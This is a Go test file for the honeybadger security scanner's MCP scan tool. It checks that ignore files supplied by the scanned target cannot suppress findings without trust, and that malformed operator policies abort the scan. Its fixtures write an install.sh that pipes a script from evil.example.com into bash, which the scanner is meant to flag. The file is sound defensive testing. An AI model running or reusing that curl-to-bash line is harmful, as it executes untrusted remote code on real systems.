package main

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	mcpclient "github.com/mark3labs/mcp-go/client"
	"github.com/mark3labs/mcp-go/mcp"
)

// TestMCPScanIgnoreTrustGate verifies a target-authored .honeybadgerignore
// cannot suppress findings on the MCP path without operator authorization. A
// HIGH supply-chain finding (sc-curl-pipe-bash) is driven through the full MCP
// entry point, not the ignore package directly.
func TestMCPScanIgnoreTrustGate(t *testing.T) {
	c, err := mcpclient.NewInProcessClient(newMCPServer(""))
	if err != nil {
		t.Fatalf("NewInProcessClient: %v", err)
	}
	defer c.Close()
	ctx := context.Background()
	initReq := mcp.InitializeRequest{}
	initReq.Params.ProtocolVersion = mcp.LATEST_PROTOCOL_VERSION
	initReq.Params.ClientInfo = mcp.Implementation{Name: "test", Version: "1.0"}
	if _, err := c.Initialize(ctx, initReq); err != nil {
		t.Fatalf("Initialize: %v", err)
	}

	// install.sh pipes a remote script to bash: HIGH at the family tier.
	dir := t.TempDir()
	writeTestFile(t, dir, "install.sh", "#!/bin/bash\ncurl https://evil.example.com/setup.sh | bash\n")
	writeTestFile(t, dir, ".honeybadgerignore", "sc-curl-pipe-bash\n")

	// Baseline with no ignore inputs confirms the HIGH finding is really
	// present, so the gate assertions below are not vacuously true.
	baseHigh := findingCount(callScan(t, c, ctx, dir, "family").resultMap, "high")
	if baseHigh < 1 {
		t.Fatalf("baseline expected >=1 HIGH (sc-curl-pipe-bash), got %d", baseHigh)
	}

	t.Run("safe_operator_suppresses_target_does_not", func(t *testing.T) {
		// Operator policy suppresses the rule; target file present but untrusted.
		opFile := filepath.Join(t.TempDir(), "operator.honeybadgerignore")
		if err := os.WriteFile(opFile, []byte("sc-curl-pipe-bash\n"), 0o644); err != nil {
			t.Fatalf("writing operator policy: %v", err)
		}
		res := callScanArgs(t, c, ctx, map[string]any{
			"repo_url": dir, "paranoia": "family", "ignore_file": opFile,
		})
		if got := findingCount(res.resultMap, "high"); got != baseHigh-1 {
			t.Errorf("HIGH count = %d, want %d (operator suppresses the one HIGH)", got, baseHigh-1)
		}
		applied := summarySources(res.resultMap, "applied")
		if !contains(applied, "operator") || contains(applied, "target") {
			t.Errorf("applied = %v, want operator only (never target when untrusted)", applied)
		}
	})

	t.Run("malicious_target_cannot_suppress_without_trust", func(t *testing.T) {
		// No trust flag, no operator policy: the finding survives, never PASS.
		res := callScan(t, c, ctx, dir, "family")
		if got := findingCount(res.resultMap, "high"); got != baseHigh {
			t.Errorf("HIGH count = %d, want %d (target ignore must NOT suppress)", got, baseHigh)
		}
		if ignored := summarySources(res.resultMap, "ignored"); !contains(ignored, "target") {
			t.Errorf("ignored = %v, want to contain %q", ignored, "target")
		}
		if res.verdict == "PASS" {
			t.Errorf("verdict = %q, want FAIL or WARN (not unqualified PASS)", res.verdict)
		}
	})
}

// TestMCPScanIgnoreMalformedTargetAndOperatorError pins the two asymmetric
// ignore-policy failure modes at the MCP scan entry point (honeybadger_scan via
// runScan), which is the contract boundary the CLI/helper tests do not cover:
//
//   - A malformed target-authored .honeybadgerignore is untrusted input and
//     MUST degrade gracefully: the MCP scan completes with no error, the
//     malformed target is never an applied suppression source, and the finding
//     it would have suppressed (had it parsed) survives, so the verdict is not
//     an unqualified PASS.
//
//   - A malformed operator-supplied ignore_file is trusted operator input and
//     MUST be fatal: the MCP scan aborts and returns the ignorePolicyLoadError
//     wording rather than proceeding.
func TestMCPScanIgnoreMalformedTargetAndOperatorError(t *testing.T) {
	c, err := mcpclient.NewInProcessClient(newMCPServer(""))
	if err != nil {
		t.Fatalf("NewInProcessClient: %v", err)
	}
	defer c.Close()
	ctx := context.Background()
	initReq := mcp.InitializeRequest{}
	initReq.Params.ProtocolVersion = mcp.LATEST_PROTOCOL_VERSION
	initReq.Params.ClientInfo = mcp.Implementation{Name: "test", Version: "1.0"}
	if _, err := c.Initialize(ctx, initReq); err != nil {
		t.Fatalf("Initialize: %v", err)
	}

	// Baseline: an identical tree with no .honeybadgerignore confirms the HIGH
	// sc-curl-pipe-bash finding is really present, so the subtests below are
	// not vacuously true.
	baseDir := t.TempDir()
	writeTestFile(t, baseDir, "install.sh", "#!/bin/bash\ncurl https://evil.example.com/setup.sh | bash\n")
	baseHigh := findingCount(callScan(t, c, ctx, baseDir, "family").resultMap, "high")
	if baseHigh < 1 {
		t.Fatalf("baseline expected >=1 HIGH (sc-curl-pipe-bash), got %d", baseHigh)
	}

	t.Run("malformed_target_degrades_without_abort", func(t *testing.T) {
		// Three tokens is syntactically invalid (Parse rejects >2 tokens), so
		// LoadPolicyFromContent swallows the target parse error and leaves
		// policy.Target==nil. callScan t.Fatals on any tool/protocol error, so
		// reaching the assertions at all proves the scan completed.
		dir := t.TempDir()
		writeTestFile(t, dir, "install.sh", "#!/bin/bash\ncurl https://evil.example.com/setup.sh | bash\n")
		writeTestFile(t, dir, ".honeybadgerignore", "sc-curl-pipe-bash install.sh extra-token\n")

		res := callScan(t, c, ctx, dir, "family")

		// The malformed target must not suppress: the HIGH count matches the
		// no-ignore baseline exactly.
		if got := findingCount(res.resultMap, "high"); got != baseHigh {
			t.Errorf("HIGH count = %d, want %d (malformed target must not suppress)", got, baseHigh)
		}
		// A malformed target parses to Target==nil, so it is reported as
		// neither applied nor matched: it must never show up as an applied
		// suppression source.
		if applied := summarySources(res.resultMap, "applied"); contains(applied, "target") {
			t.Errorf("applied = %v, want target absent (malformed target is not-applied)", applied)
		}
		// The surviving HIGH means the verdict is not an unqualified PASS.
		if res.verdict == "PASS" {
			t.Errorf("verdict = %q, want FAIL or WARN (not unqualified PASS)", res.verdict)
		}
	})

	t.Run("malformed_operator_file_is_fatal", func(t *testing.T) {
		// A malformed operator-supplied policy is trusted input: it must abort
		// the scan, not degrade to a warning. We call CallTool directly (not
		// callScanArgs, which would t.Fatal on IsError) to observe the error.
		dir := t.TempDir()
		writeTestFile(t, dir, "install.sh", "#!/bin/bash\ncurl https://evil.example.com/setup.sh | bash\n")
		opFile := filepath.Join(t.TempDir(), "operator.honeybadgerignore")
		if err := os.WriteFile(opFile, []byte("sc-curl-pipe-bash install.sh extra-token\n"), 0o644); err != nil {
			t.Fatalf("writing operator policy: %v", err)
		}

		req := mcp.CallToolRequest{}
		req.Params.Name = "honeybadger_scan"
		req.Params.Arguments = map[string]any{
			"repo_url": dir, "paranoia": "family", "ignore_file": opFile,
		}
		result, err := c.CallTool(ctx, req)
		if err != nil {
			t.Fatalf("CallTool: %v", err)
		}
		if !result.IsError {
			t.Fatalf("expected tool error for malformed operator file, got success: %+v", result.Content)
		}
		text, ok := mcp.AsTextContent(result.Content[0])
		if !ok {
			t.Fatalf("expected TextContent, got %T", result.Content[0])
		}
		// The abort must carry the ignorePolicyLoadError wording, proving the
		// scan aborted specifically because the trusted operator file failed to
		// parse, not from some other fetch/scan error.
		for _, want := range []string{
			"scan failed",
			"--ignore-file",
			"trusted operator input",
			"must parse",
		} {
			if !strings.Contains(text.Text, want) {
				t.Errorf("operator-file error missing %q; got: %s", want, text.Text)
			}
		}
	})
}

// findingCount returns the count for a severity from "finding_counts", or -1.
func findingCount(resultMap map[string]any, severity string) int {
	n, _ := resultMap["finding_counts"].(map[string]any)[severity].(float64)
	return int(n)
}

// summarySources returns the list under key ("applied"/"ignored") of the
// result's "suppression_summary", or nil when absent/malformed.
func summarySources(resultMap map[string]any, key string) []string {
	summary, _ := resultMap["suppression_summary"].(map[string]any)
	raw, ok := summary[key].([]any)
	if !ok {
		return nil
	}
	out := make([]string, 0, len(raw))
	for _, v := range raw {
		if s, ok := v.(string); ok {
			out = append(out, s)
		}
	}
	return out
}
